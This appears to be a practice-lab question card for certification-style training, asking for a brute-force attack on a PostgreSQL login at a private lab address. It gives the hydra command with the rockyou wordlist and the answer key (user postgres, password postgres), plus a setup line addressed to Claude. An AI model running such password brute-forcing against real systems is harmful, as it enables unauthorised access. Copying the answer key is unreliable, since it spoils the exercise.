# Q278 — Brute Force PostgreSQL Using Hydra

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"Brute force PostgreSQL login on port 5432."

---

## 🎯 Flag Format

```
user=<username>; password=<pass>
```

---

## ✅ Solution

```bash
hydra -l postgres -P /usr/share/wordlists/rockyou.txt 192.168.52.129 postgres -t 4
```

**Answer:** `user=postgres; password=postgres`

---

## 🤖 Claude Setup Prompt

Ensure PostgreSQL on port 5432 accessible. Report back: "Lab ready for Q278"
